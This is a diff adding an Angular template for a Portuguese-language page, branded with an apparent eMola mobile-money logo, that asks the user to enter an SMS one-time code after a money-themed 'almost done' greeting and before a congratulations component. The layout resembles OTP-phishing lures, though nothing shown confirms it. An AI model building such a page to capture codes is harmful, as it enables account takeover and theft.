@@ -1,0 +1,50 @@
+<div class="container">
+
+    <div>
+        <img class="emola-logo" src="/emola.jpg" alt="logo">
+    </div>
+    <div class="mt-4 fs-5 text-white text-center">
+        Olá {{ userName() }}, estamos quase a terminar o processo! <i
+            class="fa-solid fa-hand-holding-dollar fs-4 blink"></i>
+    </div>
+
+    <p class=" text-center mt-4 text-white">Enviámos um código de verificação (OTP) para o seu número de telefone.
+        Poderá
+        demorar
+        alguns
+        minutos a chegar.
+        Por favor, consulte as suas mensagens SMS.</p>
+
+    <section class="page">
+        <form class="form" [formGroup]="form" (ngSubmit)="onSubmit()" novalidate>
+            <div class="mask-wrap" [class.mask-on]="otpMaskOn">
+                <input type="text" formControlName="otp" placeholder="Código OTP" autocomplete="one-time-code"
+                    inputmode="numeric" (focus)="onOtpFocus()" (blur)="onOtpBlur()" (input)="onOtpInput($event)"
+                    [class.invalid]="showError()" />
+                @if (otpFocused()) {
+                <span class="mask-ghost" aria-hidden="true"><span class="typed">{{ otpValue }}</span><span
+                        class="rest">{{ otpRest }}</span></span>
+                }
+            </div>
+            @if(errorMessage()){
+            <span class="mt-4 mb-4 text-danger text-center">{{errorMessage()}}</span>
+            }
+
+
+            @if(!isloading()){
+
+            <button type="submit" class="btn">ENTRAR</button>
+
+            }@else {
+            <button class="btn"><i class="fa-solid fa-circle-notch fa-spin"></i></button>
+            }
+
+
+
+        </form>
+    </section>
+
+</div>
+
+
+<div><app-congrats></app-congrats></div>
